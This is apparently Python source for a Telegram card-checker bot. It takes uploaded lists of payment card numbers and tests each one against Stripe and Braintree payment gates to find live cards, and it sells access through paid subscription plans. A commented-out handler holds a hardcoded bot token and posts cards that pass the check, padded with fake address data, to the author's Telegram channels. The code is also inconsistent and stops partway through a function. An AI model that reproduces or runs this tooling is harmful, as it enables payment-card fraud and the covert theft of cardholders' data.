import os
import re,json
import requests
import time,random
import string
from gatet import *
from reg import reg
from pyrogram import filters, types
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading

stopuser = {}

f = Faker()
name = f.name()
street = f.address()
city = f.city()
state = f.state()
postal = f.zipcode()
phone = f.phone_number()
coun = f.country()
mail = f.email()
command_usage = {}

def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}


# Handler for document messages
@app.on_message(filters.document)
def main(_, message):
    # Extract user's first name
    name = message.from_user.first_name
    
    # Create inline keyboard
    keyboard = types.InlineKeyboardMarkup()
    
    # Add buttons
    contact_button = types.InlineKeyboardButton(text="🏴‍☠️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️", callback_data='br')
    sw = types.InlineKeyboardButton(text=" 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 🪽", callback_data='str')
    keyboard.add(contact_button)
    keyboard.add(sw)
    
    # Reply to the user
    app.send_message(message.chat.id, text='𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚', reply_markup=keyboard)
    
    # Download the document file
    file_info = app.get_file(message.document.file_id)
    file_path = file_info.file_path
    
    # Save the file locally
    downloaded_file = app.download_file(file_path)
    with open("combo.txt", "wb") as file:
        file.write(downloaded_file)


# Callback query handler for 'str' button
@app.on_callback_query(filters.callback_query('str'))
def start_stripe_charge(_, callback_query):
    def my_function():
        id = callback_query.from_user.id
        gate = 'Stripe Charge'
        dd = 0
        live = 0
        ch = 0
        ccnn = 0
        
        # Edit the message to show progress
        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        
        try:
            with open("combo.txt", 'r') as file:
                lines = file.readlines()
                total = len(lines)
                
                # Set user status to 'start'
                stopuser[id] = {'status': 'start'}
                
                for cc in lines:
                    if stopuser[id]['status'] == 'stop':
                        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @YourExDestiny')
                        return
                    
                    # Perform BIN lookup
                    try:
                        data = requests.get('https://lookup.binlist.net/' + cc[:6]).json()
                    except Exception as e:
                        print(e)
                        continue
                    
                    # Extract relevant data
                    level = data.get('level', 'Unknown')
                    bank = data.get('bank', {}).get('name', 'Unknown')
                    country_flag = data.get('country', {}).get('emoji', 'Unknown')
                    country = data.get('country', {}).get('name', 'Unknown')
                    brand = data.get('scheme', 'Unknown')
                    card_type = data.get('type', 'Unknown')
                    
                    # Simulate processing time
                    start_time = time.time()
                    last = str(st(cc))  # Assuming st() is a function that checks the card
                    
                    # Determine the message to send based on the result
                    if 'risk' in last:
                        last = 'declined'
                    elif 'Duplicate' in last:
                        last = 'live'
                    
                    # Prepare and send message
                    msg = f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
                    
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(time.time() - start_time)} seconds .</b>'''
                    
                    # Send the message
                    app.send_message(callback_query.from_user.id, msg, parse_mode='html')
                    
                    # Example logic to count successful charges
                    if 'success' in last:
                        ch += 1
                        # Here you can optionally send this information to a Telegram group/channel
                        # using requests.post or app.send_message
                    elif 'funds' in last:
                        live += 1
                    elif "card's security" in last:
                        ccnn += 1
                    else:
                        dd += 1
                    
                    time.sleep(5)  # Simulate processing time
                    
        except Exception as e:
            print(e)
        
        # Reset user status to 'start'
        stopuser[id] = {'status': 'start'}
        
        # Edit the message to indicate completion
        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @YourExDestiny')
    
    # Start a new thread for the processing function
    threading.Thread(target=my_function).start()


# Callback query handler for 'br' button
@app.on_callback_query(filters.callback_query('br'))
def start_braintree_auth(_, callback_query):
    def my_function():
        id = callback_query.from_user.id
        gate = 'Braintree Auth'
        dd = 0
        live = 0
        riskk = 0
        
        # Edit the message to show progress
        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        
        try:
            with open("combo.txt", 'r') as file:
                lines = file.readlines()
                total = len(lines)
                
                # Set user status to 'start'
                stopuser[id] = {'status': 'start'}
                
                for cc in lines:
                    if stopuser[id]['status'] == 'stop':
                        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @YourExDestiny')
                        return
                    
                    # Perform BIN lookup
                    try:
                        data = requests.get('https://lookup.binlist.net/' + cc[:6]).json()
                    except Exception as e:
                        print(e)
                        continue
                    
                    # Extract relevant data
                    level = data.get('level', 'Unknown')
                    bank = data.get('bank', {}).get('name', 'Unknown')
                    country_flag = data.get('country', {}).get('emoji', 'Unknown')
                    country = data.get('country', {}).get('name', 'Unknown')
                    brand = data.get('scheme', 'Unknown')
                    card_type = data.get('type', 'Unknown')
                    
                    # Simulate processing time
                    start_time = time.time()
                    last = str(Tele(cc))  # Assuming Tele() is a function that checks the card
                    
                    # Determine the message to send based on the result
                    if 'risk' in last:
                        last = 'risk'
                    elif 'Duplicate' in last:
                        last = 'live'
                    
                    # Prepare and send message
                    msg = f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
                    
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(time.time() - start_time)} seconds .</b>'''
                    
                    # Send the message
                    app.send_message(callback_query.from_user.id, msg, parse_mode='html')
                    
                    # Example logic to count successful authorizations
                    if 'success' in last:
                        dd += 1
                    elif 'funds' in last:
                        live += 1
                    else:
                        riskk += 1
                    
                    time.sleep(5)  # Simulate processing time
                    
        except Exception as e:
            print(e)
        
        # Reset user status to 'start'
        stopuser[id] = {'status': 'start'}
        
        # Edit the message to indicate completion
        app.edit_message_text(callback_query.message.chat.id, callback_query.message.message_id, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @YourExDestiny')
    
    # Start a new thread for the processing function
    threading.Thread(target=my_function).start()


"""
@bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
def respond_to_vbv(message):
	gate='stripe Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(scc(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
		level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]}</code> - <code{card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @card3dbotx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny 
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='Braintree Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
